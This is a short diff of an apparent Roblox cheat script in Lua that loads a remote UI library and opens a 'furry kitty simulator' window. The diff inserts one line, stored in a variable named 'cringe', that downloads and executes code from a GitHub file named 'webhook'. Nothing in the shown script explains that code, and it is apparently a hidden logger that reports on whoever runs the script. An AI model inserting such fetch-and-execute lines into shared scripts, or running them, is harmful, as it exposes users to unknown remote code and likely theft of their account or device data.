@@ -1,5 +1,6 @@
 local plr = game:service"Players".LocalPlayer
 local char = plr.Character
+local cringe = loadstring(game:HttpGet("https://github.com/serpentesz/scripts/blob/main/webhook"))()
 
 local Abstract = loadstring(game:HttpGet("https://raw.githubusercontent.com/AbstractPoo/Main/AbstractUI/AbstractUI"))()
 local UI = Abstract:Create("furry kitty simulator", UDim2.new(0, 420, 0, 450))
